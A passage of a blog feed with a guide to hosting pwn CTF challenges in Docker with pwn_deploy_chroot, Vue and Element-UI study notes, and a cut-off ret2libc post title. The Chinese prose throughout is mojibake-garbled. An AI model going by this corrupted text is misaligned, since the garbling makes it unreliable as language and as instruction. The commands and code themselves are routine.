        <content type="html"><![CDATA[<h1 id="Linux-pwné¢˜ç›®éƒ¨ç½²ç¯å¢ƒæ­å»º"><a href="#Linux-pwné¢˜ç›®éƒ¨ç½²ç¯å¢ƒæ­å»º" class="headerlink" title="Linux pwné¢˜ç›®éƒ¨ç½²ç¯å¢ƒæ­å»º"></a>Linux pwné¢˜ç›®éƒ¨ç½²ç¯å¢ƒæ­å»º</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¯å¢ƒï¼šUbuntu 16.04è™šæ‹Ÿæœº</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><h2 id="æ›´æ¢è½¯ä»¶æºä¸ºé˜¿é‡Œæº"><a href="#æ›´æ¢è½¯ä»¶æºä¸ºé˜¿é‡Œæº" class="headerlink" title="æ›´æ¢è½¯ä»¶æºä¸ºé˜¿é‡Œæº"></a>æ›´æ¢è½¯ä»¶æºä¸ºé˜¿é‡Œæº</h2><ol><li><p>å¤‡ä»½</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre></li><li><p>ä¿®æ”¹</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo vim /etc/apt/sources.list</code></pre><p>å°†source.listæ–‡ä»¶å†…å®¹æ›¿æ¢æˆä¸‹é¢çš„</p><pre class=" language-lang-txt"><code class="language-lang-txt"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</code></pre></li><li><p>æ›´æ–°</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo apt-get update</code></pre></li></ol><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Dockeræ˜¯ä¸€ç§å®¹å™¨ï¼Œå¯ä»¥ç†è§£ä¸ºè½»é‡çº§è™šæ‹Ÿæœºï¼Œç”±äºå ç”¨çš„èµ„æºå°‘ï¼Œå¯ä»¥åŒæ—¶å¼€å¯å¾ˆå¤šä¸ªdockerï¼Œæ‰€ä»¥å¾ˆé€‚åˆæ¥åšctfé¢˜ç›®çš„å®¹å™¨ã€‚<br>æˆ‘å‚è€ƒçš„æ˜¯è¿™ç¯‡åšå®¢ <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html#autoid-0-0-0" target="_blank" rel="noopener">è¿™å¯èƒ½æ˜¯æœ€ä¸ºè¯¦ç»†çš„Dockerå…¥é—¨åè¡€æ€»ç»“</a>ï¼Œå…³äºdockerçš„æ¦‚å¿µå’ŒåŸºæœ¬ç”¨æ³•å¤§ä½¬è®²çš„å¾ˆè¯¦ç»†äº†ã€‚<br>ç”±äºæˆ‘åœ¨ubuntuä¸Šå®‰è£…ï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£ <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">Get Docker CE for Ubuntu</a>ï¼Œä¸€æ­¥ä¸€æ­¥ç…§ç€åšå°±è¡Œã€‚</p><h3 id="Dockerå®‰è£…"><a href="#Dockerå®‰è£…" class="headerlink" title="Dockerå®‰è£…"></a>Dockerå®‰è£…</h3><p>åœ¨Ubuntuä¸Š <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p><ol><li><p>æ›´æ–°ç´¢å¼•ï¼š</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>å®‰è£…è½¯ä»¶åŒ…ä»¥å…è®¸<code>apt</code>é€šè¿‡HTTPSä½¿ç”¨å­˜å‚¨åº“ï¼š</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install \    apt-transport-https \    ca-certificates \    curl \    gnupg-agent \    software-properties-common</code></pre></li><li><p>æ·»åŠ Dockerçš„å®˜æ–¹GPGå¯†é’¥ï¼š</p><pre class=" language-lang-shell"><code class="language-lang-shell">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>è¿”å›OK</p></li><li><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è®¾ç½®<strong>ç¨³å®šçš„</strong>å­˜å‚¨åº“ã€‚è¦æ·»åŠ  <strong>æ¯æ™š</strong>æˆ–<strong>æµ‹è¯•</strong>å­˜å‚¨åº“ï¼Œè¯·åœ¨ä»¥ä¸‹å‘½ä»¤ä¸­çš„å•è¯åé¢æ·»åŠ <code>nightly</code>æˆ–<code>test</code>ï¼ˆæˆ–åŒæ—¶æ·»åŠ ï¼‰<code>stable</code>ã€‚<a href="https://docs.docker.com/install/" target="_blank" rel="noopener">äº†è§£<strong>æ¯æ™š</strong>å’Œ<strong>æµ‹è¯•</strong>é¢‘é“</a>ã€‚</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo add-apt-repository \   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \   $(lsb_release -cs) \   stable"</code></pre></li></ol><h3 id="å®‰è£…DOCKER-ENGINE-ç¤¾åŒº"><a href="#å®‰è£…DOCKER-ENGINE-ç¤¾åŒº" class="headerlink" title="å®‰è£…DOCKER ENGINE-ç¤¾åŒº"></a>å®‰è£…DOCKER ENGINE-ç¤¾åŒº</h3><ol><li><p>æ›´æ–°<code>apt</code>åŒ…ç´¢å¼•ã€‚</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>å®‰è£…<em>æœ€æ–°ç‰ˆæœ¬</em>çš„Docker Engine-Communityå’Œcontainerdï¼Œæˆ–è€…è½¬åˆ°ä¸‹ä¸€æ­¥å®‰è£…ç‰¹å®šç‰ˆæœ¬ï¼š</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre></li><li><p>é€šè¿‡è¿è¡Œ<code>hello-world</code> æ˜ åƒæ¥éªŒè¯æ˜¯å¦æ­£ç¡®å®‰è£…äº†Docker Engine-Community ã€‚</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker run hello-world</code></pre></li></ol><h2 id="é•œåƒéƒ¨ç½²"><a href="#é•œåƒéƒ¨ç½²" class="headerlink" title="é•œåƒéƒ¨ç½²"></a>é•œåƒéƒ¨ç½²</h2><h3 id="è·å–Docker-Ubuntu16-04é•œåƒ"><a href="#è·å–Docker-Ubuntu16-04é•œåƒ" class="headerlink" title="è·å–Docker Ubuntu16.04é•œåƒ"></a>è·å–Docker Ubuntu16.04é•œåƒ</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker pull ubuntu:16.04</code></pre><h3 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt install docker-compose git</code></pre><h3 id="å®‰è£…pwn-deploy-chroot"><a href="#å®‰è£…pwn-deploy-chroot" class="headerlink" title="å®‰è£…pwn_deploy_chroot"></a>å®‰è£…pwn_deploy_chroot</h3><pre class=" language-lang-shell"><code class="language-lang-shell">git clone https://github.com/giantbranch/pwn_deploy_chroot.git</code></pre><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>å°†æˆ‘ä»¬çš„é¢˜ç›®æ”¾å…¥pwn_deploy_chrootçš„binç›®å½•ä¸‹ï¼Œç„¶åæ ¹æ®ä»¥ä¸‹æ“ä½œå³å¯ï¼š</p><h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ python initialize.py</code></pre><p>ä½¿ç”¨å®Œæˆåä¼šç”Ÿæˆ</p><p>docker-compose.ymlã€Dockerfileã€flags.txtã€pwn.xinetd</p><p>è¿™å‡ ä¸ªæ–‡ä»¶</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ docker-compose up --build -d</code></pre><p>æ˜¾ç¤ºdone æŸ¥çœ‹æ˜¯å¦æˆåŠŸ</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ netstat -antp | grep docker</code></pre><p>æ˜¾ç¤º</p><pre class=" language-lang-txt"><code class="language-lang-txt">tcp        0      0 192.168.111.134:33122   104.18.124.25:443       ESTABLISHED 17011/dockerd   tcp6       0      0 :::10000                :::*                    LISTEN      23036/docker-proxytcp6       0      0 :::10001                :::*                    LISTEN      23023/docker-proxytcp6       0      0 :::10002                :::*                    LISTEN      23010/docker-proxy</code></pre><p>è¡¨ç¤ºæˆåŠŸ</p><h3 id="check-amp-exp"><a href="#check-amp-exp" class="headerlink" title="check&amp;exp"></a>check&amp;exp</h3><p>è¾“å…¥<code>ifconfig</code>æŸ¥çœ‹dockerçš„ipï¼Œå°è¯•ç”¨ncè¿</p><p>å‡ºç°</p><pre class=" language-lang-shell"><code class="language-lang-shell">pwn test</code></pre><p>è¡¨ç¤ºæˆåŠŸ</p><p>è¿›å…¥å®¹å™¨</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo docker exec -ti feac591ee90a bash</code></pre><h3 id="ç¼–è¯‘C"><a href="#ç¼–è¯‘C" class="headerlink" title="ç¼–è¯‘C"></a>ç¼–è¯‘C</h3><pre class=" language-lang-shell"><code class="language-lang-shell">gcc -o hello hello.c</code></pre><h3 id="åˆå§‹åŒ–æ—¶å‡ºç°çš„é—®é¢˜"><a href="#åˆå§‹åŒ–æ—¶å‡ºç°çš„é—®é¢˜" class="headerlink" title="åˆå§‹åŒ–æ—¶å‡ºç°çš„é—®é¢˜"></a>åˆå§‹åŒ–æ—¶å‡ºç°çš„é—®é¢˜</h3><p>æˆ‘åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‡ºç°</p><pre class=" language-lang-txt"><code class="language-lang-txt">AttributeError: 'module' object has no attribute 'SSL_ST_INIT'</code></pre><p>è§£å†³æ–¹æ³•ï¼š</p><pre class=" language-lang-shell"><code class="language-lang-shell"># ls -l /usr/lib/python2.7/dist-packages/ | grep -i ssldrwxr-xr-x  3 root root   4096 Jan  9 09:23 OpenSSLdrwxr-xr-x  2 root root   4096 Jan  9 09:23 pyOpenSSL-0.15.1.egg-info# rm -rf /usr/lib/python2.7/dist-packages/OpenSSL# rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info# pip install pyopenssl# ls -l /usr/lib/python2.7/dist-packages/ |grep -i ssldrwxr-sr-x  2 root staff   4096 Jan  9 09:27 OpenSSLdrwxr-sr-x  2 root staff   4096 Jan  9 09:27 pyOpenSSL-18.0.0.dist-info</code></pre><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>ä½¿ç”¨pwn_deploy_chrootéƒ¨ç½²å›½èµ›pwnæ¯”èµ›é¢˜ç›®: <a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.x å­¦ä¹ è®°å½•</title>
      <link href="/2020/02/18/html/vue/"/>
      <url>/2020/02/18/html/vue/</url>
      
        <content type="html"><![CDATA[<h1 id="æœŸæœ«é¡¹ç›®å­¦ä¹ è®°å½•"><a href="#æœŸæœ«é¡¹ç›®å­¦ä¹ è®°å½•" class="headerlink" title="æœŸæœ«é¡¹ç›®å­¦ä¹ è®°å½•"></a>æœŸæœ«é¡¹ç›®å­¦ä¹ è®°å½•</h1><h2 id="vue3-xå­¦ä¹ "><a href="#vue3-xå­¦ä¹ " class="headerlink" title="vue3.xå­¦ä¹ "></a>vue3.xå­¦ä¹ </h2><p>å¼•å…¥ï¼š</p><pre class=" language-lang-html"><code class="language-lang-html"><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><h3 id="å®‰è£…ä¸å¸è½½"><a href="#å®‰è£…ä¸å¸è½½" class="headerlink" title="å®‰è£…ä¸å¸è½½"></a>å®‰è£…ä¸å¸è½½</h3><pre class=" language-lang-txt"><code class="language-lang-txt">npm install -g @vue/cli //å®‰è£…npm uninstall -g @vue/cli //å¸è½½</code></pre><p>æŒ‡å®šç‰ˆæœ¬å®‰è£…</p><pre class=" language-lang-txt"><code class="language-lang-txt">3.0ä»¥ä¸‹ğŸ˜”npm install -g vue-cli@ç‰ˆæœ¬å·3.0ä»¥ä¸ŠğŸ˜€npm install -g @vue/cli@ç‰ˆæœ¬å·</code></pre><h3 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><pre class=" language-lang-txt"><code class="language-lang-txt">vue create project//projectä¸ºé¡¹ç›®åç§°</code></pre><p>é¡¹ç›®åˆ›å»ºé€‰é¡¹</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175201.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175206.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175209.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175211.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175213.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175215.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175216.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175218.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175220.jpg" alt="å›¾ç‰‡æ¥è‡ªä¸æ‰‹æŠŠæ‰‹æ’¸ä»£ç å‰ç«¯"></p><h3 id="vue-é¡¹ç›®åˆå§‹åŒ–"><a href="#vue-é¡¹ç›®åˆå§‹åŒ–" class="headerlink" title="vue é¡¹ç›®åˆå§‹åŒ–"></a>vue é¡¹ç›®åˆå§‹åŒ–</h3><h4 id="vue-config-js"><a href="#vue-config-js" class="headerlink" title="vue.config.js"></a>vue.config.js</h4><pre class=" language-lang-js"><code class="language-lang-js">const path = require('path');module.exports = {  // åŸºæœ¬è·¯å¾„  publicPath: process.env.NODE_ENV === 'production' ? '' : '/',  // è¾“å‡ºæ–‡ä»¶ç›®å½•  outputDir: process.env.NODE_ENV === 'production' ? 'dist' : 'devdist',  // eslint-loader æ˜¯å¦åœ¨ä¿å­˜çš„æ—¶å€™æ£€æŸ¥  lintOnSave: true,  /**   * webpacké…ç½®,see https://github.com/vuejs/vue-cli/blob/dev/docs/webpack.md   **/  chainWebpack: (config) =&gt; {  },  configureWebpack: (config) =&gt; {    // config.resolve = { // é…ç½®è§£æåˆ«å    //   extensions: ['.js', '.json', '.vue'],    //   alias: {    //     '@': path.resolve(__dirname, './src'),    //     'public': path.resolve(__dirname, './public'),    //     'components': path.resolve(__dirname, './src/components'),    //     'common': path.resolve(__dirname, './src/common'),    //     'api': path.resolve(__dirname, './src/api'),    //     'views': path.resolve(__dirname, './src/views'),    //     'data': path.resolve(__dirname, './src/data')    //   }    // }  },  // ç”Ÿäº§ç¯å¢ƒæ˜¯å¦ç”Ÿæˆ sourceMap æ–‡ä»¶  productionSourceMap: false,  // cssç›¸å…³é…ç½®  css: {    // æ˜¯å¦ä½¿ç”¨cssåˆ†ç¦»æ’ä»¶ ExtractTextPlugin    extract: true,    // å¼€å¯ CSS source maps?    sourceMap: false,    // cssé¢„è®¾å™¨é…ç½®é¡¹    loaderOptions: {    },    // å¯ç”¨ CSS modules for all css / pre-processor files.    modules: false  },  // use thread-loader for babel &amp; TS in production build  // enabled by default if the machine has more than 1 cores  parallel: require('os').cpus().length &gt; 1,  /**   *  PWA æ’ä»¶ç›¸å…³é…ç½®,see https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa   */  pwa: {},  // webpack-dev-server ç›¸å…³é…ç½®  devServer: {    open: false, // ç¼–è¯‘å®Œæˆæ˜¯å¦æ‰“å¼€ç½‘é¡µ    host: '0.0.0.0', // æŒ‡å®šä½¿ç”¨åœ°å€ï¼Œé»˜è®¤localhost,0.0.0.0ä»£è¡¨å¯ä»¥è¢«å¤–ç•Œè®¿é—®    port: 8080, // è®¿é—®ç«¯å£    https: false, // ç¼–è¯‘å¤±è´¥æ—¶åˆ·æ–°é¡µé¢    hot: true, // å¼€å¯çƒ­åŠ è½½    hotOnly: false,    proxy: null, // è®¾ç½®ä»£ç†    overlay: { // å…¨å±æ¨¡å¼ä¸‹æ˜¯å¦æ˜¾ç¤ºè„šæœ¬é”™è¯¯      warnings: true,      errors: true    },    before: app =&gt; {    }  },  /**   * ç¬¬ä¸‰æ–¹æ’ä»¶é…ç½®   */  pluginOptions: {}}</code></pre><p>é—®é¢˜è®°å½•ï¼šä¸ºä»€ä¹ˆè¦å»ºç«‹vue.config.js?</p><h4 id="routeé‡å®šå‘"><a href="#routeé‡å®šå‘" class="headerlink" title="routeé‡å®šå‘"></a>routeé‡å®šå‘</h4><p>åœ¨routeæ–‡ä»¶å¤¹é‡Œçš„index.jsçš„ const routes ä¸­å¼•å…¥</p><p><strong>æ³¨æ„ä¸è¦æœ‰ç©ºæ ¼</strong></p><p>åœ¨index.jsçš„å¼€å¤´ä¸­å¼•å…¥ç»„ä»¶ </p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from "vue";import VueRouter from "vue-router";import Home from "../views/Home.vue";Vue.use(VueRouter);const routes = [  {    path: "/",    name: "home",    component: Home  },  {    path: "/login",    name: "login",    component:  () =&gt;      import(/* webpackChunkName: "about" */ "../views/login/index.vue")  },  {    path: "/about",    name: "about",    // route level code-splitting    // this generates a separate chunk (about.[hash].js) for this route    // which is lazy-loaded when the route is visited.    component: () =&gt;      import(/* webpackChunkName: "about" */ "../views/About.vue")  }];const router = new VueRouter({  routes});export default router;</code></pre><p>é‡å®šå‘ï¼š</p><pre class=" language-lang-js"><code class="language-lang-js">  {    path: "/",    redirect: "login"  }</code></pre><h4 id="å¼•å…¥å…¨å±€æ ·å¼"><a href="#å¼•å…¥å…¨å±€æ ·å¼" class="headerlink" title="å¼•å…¥å…¨å±€æ ·å¼"></a>å¼•å…¥å…¨å±€æ ·å¼</h4><p>åœ¨vue.config.jsçš„ // cssé¢„è®¾å™¨é…ç½®é¡¹å¤„æ·»åŠ ï¼Œç”±äºæœ¬ç³»ç»Ÿé€‰ç”¨çš„sassçš„é¢„ç¼–è¯‘æ¨¡å¼ï¼Œå› æ­¤éœ€è¦æ·»åŠ </p><pre class=" language-lang-js"><code class="language-lang-js">        sass: {             prependData: `@import "./src/styles/main.scss";`        }</code></pre><pre><code>@import "normalize.scss";//åœ¨main.scssä¸­å¼•å…¥</code></pre><h4 id="vueæ–‡ä»¶ç»“æ„"><a href="#vueæ–‡ä»¶ç»“æ„" class="headerlink" title="vueæ–‡ä»¶ç»“æ„"></a>vueæ–‡ä»¶ç»“æ„</h4><p>åœ¨vue.config.jsæ–‡ä»¶ä¸­å…³é—­ç™»é™†éªŒè¯</p><pre class=" language-lang-js"><code class="language-lang-js">lintOnSave: false,</code></pre><p>æ–‡ä»¶ç»“æ„</p><pre class=" language-lang-html"><code class="language-lang-html"><template>    <div>        haahha    </div></template><script>export default {}</script><style scoped=""></style></code></pre><p>æ³¨æ„ï¼š</p><ol><li>å†…å®¹å¤–è¾¹å¿…é¡»æœ‰ä¸€å±‚æ ‡ç­¾åŒ…è£¹</li><li>style scopedå±æ€§æ˜¯æ–‡ä»¶å†…æ ·å¼</li><li>script ä¸ºè„šæœ¬æ–‡ä»¶å¼•ç”¨åŒº</li><li>åœ¨vueä¸­main.jsä¸ºæ¡†æ¶çš„ä¸»å…¥å£ï¼Œå¦‚æœéœ€è¦å¼•å…¥ä¸€äº›ä¸œè¥¿çš„è¯ç›´æ¥åœ¨main.jsä¸­å¼•å…¥å°±å¥½äº†</li></ol><p>å¯ä»¥åˆ é™¤app.vueä¸­çš„æ ·å¼ä»¥åŠnav</p><h4 id="å¼•å…¥element-ui"><a href="#å¼•å…¥element-ui" class="headerlink" title="å¼•å…¥element-ui"></a>å¼•å…¥element-ui</h4><h5 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h5><pre class=" language-lang-txt"><code class="language-lang-txt">cnpm i element-ui -Snpm i element-ui -S</code></pre><p>ä¸¤ä¸ªé€‰ä¸€ä¸ªç”¨</p><p>å¼•å…¥</p><ol><li>å…¨éƒ¨å¼•å…¥</li><li>æŒ‰éœ€å¼•å…¥</li></ol><p>1.å…¨éƒ¨å¼•å…¥</p><p>åœ¨main.jsä¸­å†™å…¥ï¼š</p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from 'vue';import ElementUI from 'element-ui';import 'element-ui/lib/theme-chalk/index.css';import App from './App.vue';Vue.use(ElementUI);new Vue({  el: '#app',  render: h =&gt; h(App)});</code></pre><p>2.æŒ‰éœ€å¼•å…¥</p><p>æš‚æ—¶ä¸åšè¯¦ç»†ï¼Œçœ‹å®˜æ–¹æ–‡æ¡£</p><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h5 id="é—®é¢˜ï¼ˆå¼•å…¥åæ²¡æœ‰æ ·å¼ï¼‰"><a href="#é—®é¢˜ï¼ˆå¼•å…¥åæ²¡æœ‰æ ·å¼ï¼‰" class="headerlink" title="é—®é¢˜ï¼ˆå¼•å…¥åæ²¡æœ‰æ ·å¼ï¼‰"></a>é—®é¢˜ï¼ˆå¼•å…¥åæ²¡æœ‰æ ·å¼ï¼‰</h5><p>elementUIå¼•å…¥æ²¡æœ‰æ ·å¼çš„åŸå› ï¼š</p><p>åœ¨vue.config.jsçš„cssä¸­ä¿®æ”¹requireModuleExtensionä¸ºtrue</p><pre class=" language-lang-js"><code class="language-lang-js">      requireModuleExtension: true</code></pre><p>å³ä½¿ç”¨CSS models</p><h3 id="vueåŸºç¡€è¯­æ³•ä½¿ç”¨"><a href="#vueåŸºç¡€è¯­æ³•ä½¿ç”¨" class="headerlink" title="vueåŸºç¡€è¯­æ³•ä½¿ç”¨"></a>vueåŸºç¡€è¯­æ³•ä½¿ç”¨</h3><h4 id="vue-for"><a href="#vue-for" class="headerlink" title="vue-for"></a>vue-for</h4><h2 id="ElementUI"><a href="#ElementUI" class="headerlink" title="ElementUI"></a>ElementUI</h2><p>å¼•å…¥ï¼š</p><pre class=" language-lang-html"><code class="language-lang-html"><!--å¼•å…¥ElementUIç»„ä»¶-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css"></code></pre><pre class=" language-lang-html"><code class="language-lang-html"><!-- import Vue before Element --><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h2 id="ç‚¹å‡»å¼¹å‡ºè¡¨å•äº‹ä»¶å¤„ç†"><a href="#ç‚¹å‡»å¼¹å‡ºè¡¨å•äº‹ä»¶å¤„ç†" class="headerlink" title="ç‚¹å‡»å¼¹å‡ºè¡¨å•äº‹ä»¶å¤„ç†"></a>ç‚¹å‡»å¼¹å‡ºè¡¨å•äº‹ä»¶å¤„ç†</h2><pre class=" language-lang-html"><code class="language-lang-html">    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <!--å¼•å…¥ElementUIç»„ä»¶-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">    <link rel="stylesheet" href="css/index.css">    <title>reg</title>    <div id="app">        <!--Form-->        <el-button type="button" @click="dialogFormVisible = true">æ³¨å†Œ</el-button>        <el-dialog title="æ³¨å†Œä¿¡æ¯å¡«å†™" :visible.sync="dialogFormVisible">            <el-form :model="form">              <el-form-item label="åç§°" :label-width="formlabelwidth">                  <el-input v-model="form.name" placeholder="username"></el-input>              </el-form-item>            </el-form>        </el-dialog>    </div><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script><!--import index.js--><script>    var Main = {    data(){        return{            dialogFormVisible: false,            form: {                name: '',            },            formLabelWidth: '120px'        };    }};var Ctor=Vue.extend(Main)new Ctor().$mount('#app')</script></code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191215211442.png" alt="å±å¹•æˆªå›¾"></p><h2 id="ä¸»ç•Œé¢è®¾è®¡"><a href="#ä¸»ç•Œé¢è®¾è®¡" class="headerlink" title="ä¸»ç•Œé¢è®¾è®¡"></a>ä¸»ç•Œé¢è®¾è®¡</h2><h3 id="ä¸»é¢˜è‰²å½©é€‰æ‹©"><a href="#ä¸»é¢˜è‰²å½©é€‰æ‹©" class="headerlink" title="ä¸»é¢˜è‰²å½©é€‰æ‹©"></a>ä¸»é¢˜è‰²å½©é€‰æ‹©</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----ret2libc</title>
      <link href="/2020/02/18/ctf/pwn/pwn-re2libc/"/>
      <url>/2020/02/18/ctf/pwn/pwn-re2libc/</url>
      
